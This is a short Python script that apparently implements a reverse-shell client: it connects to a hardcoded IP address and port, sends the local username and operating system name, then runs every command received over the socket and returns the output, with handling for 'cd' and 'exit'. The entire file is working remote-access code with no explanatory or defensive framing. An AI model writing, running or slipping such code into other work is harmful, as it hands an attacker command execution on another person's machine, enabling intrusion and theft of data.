from socket import *
import subprocess
from getpass import getuser
import platform
import os

get_os = platform.uname()[0]
get_user = getuser()
os_info = "client_name : "+str(get_user)+" <-> "+"client_os : "+str(get_os)

ip = "192.168.27.65" 
port = 3924
connection = socket(AF_INET,SOCK_STREAM)
connection.connect((ip,port))

connection.send(os_info.encode())

while True:
    reciever = connection.recv(1024).decode()

    if reciever == "exit":
        connection.close()
        break

    elif reciever[:2] == "cd":
        if(reciever[3:] != ""):
            os.chdir(reciever[3:])
            connection.send(os.getcwd().encode())
        else:
            out_put = "error"
            connection.send(out_put.encode())

    else:
        out_put = subprocess.getoutput(reciever)

        if out_put == "" or out_put == None:
            out_put = "error"
            connection.send(out_put.encode())

        else:
            connection.send(out_put.encode())
